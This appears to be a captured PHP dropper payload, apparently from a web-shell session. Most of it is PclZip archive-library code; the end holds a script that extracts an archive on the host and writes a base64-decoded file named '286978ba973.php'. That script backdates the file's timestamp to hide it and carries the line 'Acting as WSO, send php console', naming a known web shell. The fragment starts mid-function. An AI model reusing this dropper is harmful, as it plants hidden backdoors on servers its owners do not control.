  if (($v_result=$this->privOpenFd('rb')) != 1)
  {
    return $v_result;
  }

  $v_central_dir = array();
  if (($v_result = $this->privReadEndCentralDir($v_central_dir)) != 1)
  {
    $this->privCloseFd();
    return $v_result;
  }

  @rewind($this->zip_fd);

  $v_pos_entry = $v_central_dir['offset'];
  @rewind($this->zip_fd);
  if (@fseek($this->zip_fd, $v_pos_entry))
  {
    $this->privCloseFd();

    PclZip::privErrorLog(PCLZIP_ERR_INVALID_ARCHIVE_ZIP, 'Invalid archive size');

    return PclZip::errorCode();
  }

  $v_header_list = array();
  $j_start = 0;
  for ($i=0, $v_nb_extracted=0; $i<$v_central_dir['entries']; $i++)
  {

    $v_header_list[$v_nb_extracted] = array();
    if (($v_result = $this->privReadCentralFileHeader($v_header_list[$v_nb_extracted])) != 1)
    {
      $this->privCloseFd();

      return $v_result;
    }


    $v_header_list[$v_nb_extracted]['index'] = $i;

    $v_found = false;

    if (   (isset($p_options[PCLZIP_OPT_BY_NAME]))
        && ($p_options[PCLZIP_OPT_BY_NAME] != 0)) {

        for ($j=0; ($j<sizeof($p_options[PCLZIP_OPT_BY_NAME])) && (!$v_found); $j++) {

            if (substr($p_options[PCLZIP_OPT_BY_NAME][$j], -1) == "/") {

                if (   (strlen($v_header_list[$v_nb_extracted]['stored_filename']) > strlen($p_options[PCLZIP_OPT_BY_NAME][$j]))
                    && (substr($v_header_list[$v_nb_extracted]['stored_filename'], 0, strlen($p_options[PCLZIP_OPT_BY_NAME][$j])) == $p_options[PCLZIP_OPT_BY_NAME][$j])) {
                    $v_found = true;
                }
                elseif (   (($v_header_list[$v_nb_extracted]['external']&0x00000010)==0x00000010) 
                        && ($v_header_list[$v_nb_extracted]['stored_filename'].'/' == $p_options[PCLZIP_OPT_BY_NAME][$j])) {
                    $v_found = true;
                }
            }
            elseif ($v_header_list[$v_nb_extracted]['stored_filename'] == $p_options[PCLZIP_OPT_BY_NAME][$j]) {
                $v_found = true;
            }
        }
    }


    else if (   (isset($p_options[PCLZIP_OPT_BY_PREG]))
             && ($p_options[PCLZIP_OPT_BY_PREG] != "")) {

        if (preg_match($p_options[PCLZIP_OPT_BY_PREG], $v_header_list[$v_nb_extracted]['stored_filename'])) {
            $v_found = true;
        }
    }

    else if (   (isset($p_options[PCLZIP_OPT_BY_INDEX]))
             && ($p_options[PCLZIP_OPT_BY_INDEX] != 0)) {

        for ($j=$j_start; ($j<sizeof($p_options[PCLZIP_OPT_BY_INDEX])) && (!$v_found); $j++) {

            if (($i>=$p_options[PCLZIP_OPT_BY_INDEX][$j]['start']) && ($i<=$p_options[PCLZIP_OPT_BY_INDEX][$j]['end'])) {
                $v_found = true;
            }
            if ($i>=$p_options[PCLZIP_OPT_BY_INDEX][$j]['end']) {
                $j_start = $j+1;
            }

            if ($p_options[PCLZIP_OPT_BY_INDEX][$j]['start']>$i) {
                break;
            }
        }
    }
    else {
    	$v_found = true;
    }

    if ($v_found)
    {
      unset($v_header_list[$v_nb_extracted]);
    }
    else
    {
      $v_nb_extracted++;
    }
  }

  if ($v_nb_extracted > 0) {

      $v_zip_temp_name = PCLZIP_TEMPORARY_DIR.uniqid('pclzip-').'.tmp';

      $v_temp_zip = new PclZip($v_zip_temp_name);

      if (($v_result = $v_temp_zip->privOpenFd('wb')) != 1) {
          $this->privCloseFd();

          return $v_result;
      }

      for ($i=0; $i<sizeof($v_header_list); $i++) {

          @rewind($this->zip_fd);
          if (@fseek($this->zip_fd,  $v_header_list[$i]['offset'])) {
              $this->privCloseFd();
              $v_temp_zip->privCloseFd();
              @unlink($v_zip_temp_name);

              PclZip::privErrorLog(PCLZIP_ERR_INVALID_ARCHIVE_ZIP, 'Invalid archive size');

              return PclZip::errorCode();
          }

          $v_local_header = array();
          if (($v_result = $this->privReadFileHeader($v_local_header)) != 1) {
              $this->privCloseFd();
              $v_temp_zip->privCloseFd();
              @unlink($v_zip_temp_name);

              return $v_result;
          }
          
          if ($this->privCheckFileHeaders($v_local_header,
		                                $v_header_list[$i]) != 1) {
          }
          unset($v_local_header);

          if (($v_result = $v_temp_zip->privWriteFileHeader($v_header_list[$i])) != 1) {
              $this->privCloseFd();
              $v_temp_zip->privCloseFd();
              @unlink($v_zip_temp_name);

              return $v_result;
          }

          if (($v_result = PclZipUtilCopyBlock($this->zip_fd, $v_temp_zip->zip_fd, $v_header_list[$i]['compressed_size'])) != 1) {
              $this->privCloseFd();
              $v_temp_zip->privCloseFd();
              @unlink($v_zip_temp_name);

              return $v_result;
          }
      }

      $v_offset = @ftell($v_temp_zip->zip_fd);

      for ($i=0; $i<sizeof($v_header_list); $i++) {
          if (($v_result = $v_temp_zip->privWriteCentralFileHeader($v_header_list[$i])) != 1) {
              $v_temp_zip->privCloseFd();
              $this->privCloseFd();
              @unlink($v_zip_temp_name);

              return $v_result;
          }

          $v_temp_zip->privConvertHeader2FileInfo($v_header_list[$i], $p_result_list[$i]);
      }


      $v_comment = '';
      if (isset($p_options[PCLZIP_OPT_COMMENT])) {
        $v_comment = $p_options[PCLZIP_OPT_COMMENT];
      }

      $v_size = @ftell($v_temp_zip->zip_fd)-$v_offset;

      if (($v_result = $v_temp_zip->privWriteCentralHeader(sizeof($v_header_list), $v_size, $v_offset, $v_comment)) != 1) {
          unset($v_header_list);
          $v_temp_zip->privCloseFd();
          $this->privCloseFd();
          @unlink($v_zip_temp_name);

          return $v_result;
      }

      $v_temp_zip->privCloseFd();
      $this->privCloseFd();

      @unlink($this->zipname);

      PclZipUtilRename($v_zip_temp_name, $this->zipname);
  
      unset($v_temp_zip);
  }
  
  else if ($v_central_dir['entries'] != 0) {
      $this->privCloseFd();

      if (($v_result = $this->privOpenFd('wb')) != 1) {
        return $v_result;
      }

      if (($v_result = $this->privWriteCentralHeader(0, 0, 0, '')) != 1) {
        return $v_result;
      }

      $this->privCloseFd();
  }

  return $v_result;
}

function privDirCheck($p_dir, $p_is_dir=false)
{
  $v_result = 1;


  if (($p_is_dir) && (substr($p_dir, -1)=='/'))
  {
    $p_dir = substr($p_dir, 0, strlen($p_dir)-1);
  }

  if ((is_dir($p_dir)) || ($p_dir == ""))
  {
    return 1;
  }

  $p_parent_dir = dirname($p_dir);

  if ($p_parent_dir != $p_dir)
  {
    if ($p_parent_dir != "")
    {
      if (($v_result = $this->privDirCheck($p_parent_dir)) != 1)
      {
        return $v_result;
      }
    }
  }

  if (!@mkdir($p_dir, 0777))
  {
    PclZip::privErrorLog(PCLZIP_ERR_DIR_CREATE_FAIL, "Unable to create directory '$p_dir'");

    return PclZip::errorCode();
  }

  return $v_result;
}

function privMerge(&$p_archive_to_add)
{
  $v_result=1;

  if (!is_file($p_archive_to_add->zipname))
  {

    $v_result = 1;

    return $v_result;
  }

  if (!is_file($this->zipname))
  {

    $v_result = $this->privDuplicate($p_archive_to_add->zipname);

    return $v_result;
  }

  if (($v_result=$this->privOpenFd('rb')) != 1)
  {
    return $v_result;
  }

  $v_central_dir = array();
  if (($v_result = $this->privReadEndCentralDir($v_central_dir)) != 1)
  {
    $this->privCloseFd();
    return $v_result;
  }

  @rewind($this->zip_fd);

  if (($v_result=$p_archive_to_add->privOpenFd('rb')) != 1)
  {
    $this->privCloseFd();

    return $v_result;
  }

  $v_central_dir_to_add = array();
  if (($v_result = $p_archive_to_add->privReadEndCentralDir($v_central_dir_to_add)) != 1)
  {
    $this->privCloseFd();
    $p_archive_to_add->privCloseFd();

    return $v_result;
  }

  @rewind($p_archive_to_add->zip_fd);

  $v_zip_temp_name = PCLZIP_TEMPORARY_DIR.uniqid('pclzip-').'.tmp';

  if (($v_zip_temp_fd = @fopen($v_zip_temp_name, 'wb')) == 0)
  {
    $this->privCloseFd();
    $p_archive_to_add->privCloseFd();

    PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, 'Unable to open temporary file \''.$v_zip_temp_name.'\' in binary write mode');

    return PclZip::errorCode();
  }

  $v_size = $v_central_dir['offset'];
  while ($v_size != 0)
  {
    $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);
    $v_buffer = fread($this->zip_fd, $v_read_size);
    @fwrite($v_zip_temp_fd, $v_buffer, $v_read_size);
    $v_size -= $v_read_size;
  }

  $v_size = $v_central_dir_to_add['offset'];
  while ($v_size != 0)
  {
    $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);
    $v_buffer = fread($p_archive_to_add->zip_fd, $v_read_size);
    @fwrite($v_zip_temp_fd, $v_buffer, $v_read_size);
    $v_size -= $v_read_size;
  }

  $v_offset = @ftell($v_zip_temp_fd);

  $v_size = $v_central_dir['size'];
  while ($v_size != 0)
  {
    $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);
    $v_buffer = @fread($this->zip_fd, $v_read_size);
    @fwrite($v_zip_temp_fd, $v_buffer, $v_read_size);
    $v_size -= $v_read_size;
  }

  $v_size = $v_central_dir_to_add['size'];
  while ($v_size != 0)
  {
    $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);
    $v_buffer = @fread($p_archive_to_add->zip_fd, $v_read_size);
    @fwrite($v_zip_temp_fd, $v_buffer, $v_read_size);
    $v_size -= $v_read_size;
  }

  $v_comment = $v_central_dir['comment'].' '.$v_central_dir_to_add['comment'];

  $v_size = @ftell($v_zip_temp_fd)-$v_offset;

  $v_swap = $this->zip_fd;
  $this->zip_fd = $v_zip_temp_fd;
  $v_zip_temp_fd = $v_swap;

  if (($v_result = $this->privWriteCentralHeader($v_central_dir['entries']+$v_central_dir_to_add['entries'], $v_size, $v_offset, $v_comment)) != 1)
  {
    $this->privCloseFd();
    $p_archive_to_add->privCloseFd();
    @fclose($v_zip_temp_fd);
    $this->zip_fd = null;

    unset($v_header_list);

    return $v_result;
  }

  $v_swap = $this->zip_fd;
  $this->zip_fd = $v_zip_temp_fd;
  $v_zip_temp_fd = $v_swap;

  $this->privCloseFd();
  $p_archive_to_add->privCloseFd();

  @fclose($v_zip_temp_fd);

  @unlink($this->zipname);

  PclZipUtilRename($v_zip_temp_name, $this->zipname);

  return $v_result;
}

function privDuplicate($p_archive_filename)
{
  $v_result=1;

  if (!is_file($p_archive_filename))
  {

    $v_result = 1;

    return $v_result;
  }

  if (($v_result=$this->privOpenFd('wb')) != 1)
  {
    return $v_result;
  }

  if (($v_zip_temp_fd = @fopen($p_archive_filename, 'rb')) == 0)
  {
    $this->privCloseFd();

    PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, 'Unable to open archive file \''.$p_archive_filename.'\' in binary write mode');

    return PclZip::errorCode();
  }

  $v_size = filesize($p_archive_filename);
  while ($v_size != 0)
  {
    $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);
    $v_buffer = fread($v_zip_temp_fd, $v_read_size);
    @fwrite($this->zip_fd, $v_buffer, $v_read_size);
    $v_size -= $v_read_size;
  }

  $this->privCloseFd();

  @fclose($v_zip_temp_fd);

  return $v_result;
}

function privErrorLog($p_error_code=0, $p_error_string='')
{
  if (PCLZIP_ERROR_EXTERNAL == 1) {
    PclError($p_error_code, $p_error_string);
  }
  else {
    $this->error_code = $p_error_code;
    $this->error_string = $p_error_string;
  }
}

function privErrorReset()
{
  if (PCLZIP_ERROR_EXTERNAL == 1) {
    PclErrorReset();
  }
  else {
    $this->error_code = 0;
    $this->error_string = '';
  }
}

function privDisableMagicQuotes()
{
  $v_result=1;

  if (   (!function_exists("get_magic_quotes_runtime"))
    || (!function_exists("set_magic_quotes_runtime"))) {
    return $v_result;
}

  if ($this->magic_quotes_status != -1) {
    return $v_result;
}

$this->magic_quotes_status = @get_magic_quotes_runtime();

if ($this->magic_quotes_status == 1) {
  @set_magic_quotes_runtime(0);
}

  return $v_result;
}

function privSwapBackMagicQuotes()
{
  $v_result=1;

  if (   (!function_exists("get_magic_quotes_runtime"))
    || (!function_exists("set_magic_quotes_runtime"))) {
    return $v_result;
}

  if ($this->magic_quotes_status != -1) {
    return $v_result;
}

if ($this->magic_quotes_status == 1) {
	  @set_magic_quotes_runtime($this->magic_quotes_status);
}

  return $v_result;
}

}

function PclZipUtilPathReduction($p_dir)
{
  $v_result = "";

  if ($p_dir != "") {
    $v_list = explode("/", $p_dir);

    $v_skip = 0;
    for ($i=sizeof($v_list)-1; $i>=0; $i--) {
      if ($v_list[$i] == ".") {
      }
      else if ($v_list[$i] == "..") {
	  $v_skip++;
      }
      else if ($v_list[$i] == "") {
	  if ($i == 0) {
          $v_result = "/".$v_result;
	    if ($v_skip > 0) {
	        $v_result = $p_dir;
              $v_skip = 0;
	    }
	  }
	  else if ($i == (sizeof($v_list)-1)) {
          $v_result = $v_list[$i];
	  }
	  else {
	  }
      }
      else {
	  if ($v_skip > 0) {
	    $v_skip--;
	  }
	  else {
          $v_result = $v_list[$i].($i!=(sizeof($v_list)-1)?"/".$v_result:"");
	  }
      }
    }
    
    if ($v_skip > 0) {
      while ($v_skip > 0) {
          $v_result = '../'.$v_result;
          $v_skip--;
      }
    }
  }

  return $v_result;
}

function PclZipUtilPathInclusion($p_dir, $p_path)
{
  $v_result = 1;
  
  if (   ($p_dir == '.')
      || ((strlen($p_dir) >=2) && (substr($p_dir, 0, 2) == './'))) {
    $p_dir = PclZipUtilTranslateWinPath(getcwd(), FALSE).'/'.substr($p_dir, 1);
  }
  if (   ($p_path == '.')
      || ((strlen($p_path) >=2) && (substr($p_path, 0, 2) == './'))) {
    $p_path = PclZipUtilTranslateWinPath(getcwd(), FALSE).'/'.substr($p_path, 1);
  }

  $v_list_dir = explode("/", $p_dir);
  $v_list_dir_size = sizeof($v_list_dir);
  $v_list_path = explode("/", $p_path);
  $v_list_path_size = sizeof($v_list_path);

  $i = 0;
  $j = 0;
  while (($i < $v_list_dir_size) && ($j < $v_list_path_size) && ($v_result)) {

    if ($v_list_dir[$i] == '') {
      $i++;
      continue;
    }
    if ($v_list_path[$j] == '') {
      $j++;
      continue;
    }

    if (($v_list_dir[$i] != $v_list_path[$j]) && ($v_list_dir[$i] != '') && ( $v_list_path[$j] != ''))  {
      $v_result = 0;
    }

    $i++;
    $j++;
  }

  if ($v_result) {
    while (($j < $v_list_path_size) && ($v_list_path[$j] == '')) $j++;
    while (($i < $v_list_dir_size) && ($v_list_dir[$i] == '')) $i++;

    if (($i >= $v_list_dir_size) && ($j >= $v_list_path_size)) {
      $v_result = 2;
    }
    else if ($i < $v_list_dir_size) {
      $v_result = 0;
    }
  }

  return $v_result;
}

function PclZipUtilCopyBlock($p_src, $p_dest, $p_size, $p_mode=0)
{
  $v_result = 1;

  if ($p_mode==0)
  {
    while ($p_size != 0)
    {
      $v_read_size = ($p_size < PCLZIP_READ_BLOCK_SIZE ? $p_size : PCLZIP_READ_BLOCK_SIZE);
      $v_buffer = @fread($p_src, $v_read_size);
      @fwrite($p_dest, $v_buffer, $v_read_size);
      $p_size -= $v_read_size;
    }
  }
  else if ($p_mode==1)
  {
    while ($p_size != 0)
    {
      $v_read_size = ($p_size < PCLZIP_READ_BLOCK_SIZE ? $p_size : PCLZIP_READ_BLOCK_SIZE);
      $v_buffer = @gzread($p_src, $v_read_size);
      @fwrite($p_dest, $v_buffer, $v_read_size);
      $p_size -= $v_read_size;
    }
  }
  else if ($p_mode==2)
  {
    while ($p_size != 0)
    {
      $v_read_size = ($p_size < PCLZIP_READ_BLOCK_SIZE ? $p_size : PCLZIP_READ_BLOCK_SIZE);
      $v_buffer = @fread($p_src, $v_read_size);
      @gzwrite($p_dest, $v_buffer, $v_read_size);
      $p_size -= $v_read_size;
    }
  }
  else if ($p_mode==3)
  {
    while ($p_size != 0)
    {
      $v_read_size = ($p_size < PCLZIP_READ_BLOCK_SIZE ? $p_size : PCLZIP_READ_BLOCK_SIZE);
      $v_buffer = @gzread($p_src, $v_read_size);
      @gzwrite($p_dest, $v_buffer, $v_read_size);
      $p_size -= $v_read_size;
    }
  }

  return $v_result;
}

function PclZipUtilRename($p_src, $p_dest)
{
  $v_result = 1;

  if (!@rename($p_src, $p_dest)) {

    if (!@copy($p_src, $p_dest)) {
      $v_result = 0;
    }
    else if (!@unlink($p_src)) {
      $v_result = 0;
    }
  }

  return $v_result;
}

function PclZipUtilOptionText($p_option)
{
  
  $v_list = get_defined_constants();
  for (reset($v_list); $v_key = key($v_list); next($v_list)) {
    $v_prefix = substr($v_key, 0, 10);
    if ((   ($v_prefix == 'PCLZIP_OPT')
         || ($v_prefix == 'PCLZIP_CB_')
         || ($v_prefix == 'PCLZIP_ATT'))
        && ($v_list[$v_key] == $p_option)) {
      return $v_key;
    }
  }
  
  $v_result = 'Unknown';

  return $v_result;
}

function PclZipUtilTranslateWinPath($p_path, $p_remove_disk_letter=true)
{
  if (stristr(php_uname(), 'windows')) {
    if (($p_remove_disk_letter) && (($v_position = strpos($p_path, ':')) != false)) {
        $p_path = substr($p_path, $v_position+1);
    }
    if ((strpos($p_path, '\\') > 0) || (substr($p_path, 0,1) == '\\')) {
        $p_path = strtr($p_path, '\\', '/');
    }
  }
  return $p_path;
}




$archive = new PclZip("nowir.zip");
if ($archive->extract() == 0) {
die("Error : ".$archive->errorInfo(true));
}
else
{
die("1425756856");	
}";
            $file_name = "286978ba973.php";
            if( file_exists($file_name) ){
                copy($file_name, $file_name."_backup");
            }
            if( file_put_contents($file_name, base64_decode($a)) )
            {		
                echo "OK file saved";
                touch($file_name, time() - 3600 * 24 * rand(10, 70));
            }
p2 = 
p3 = 
Acting as WSO, send php console.
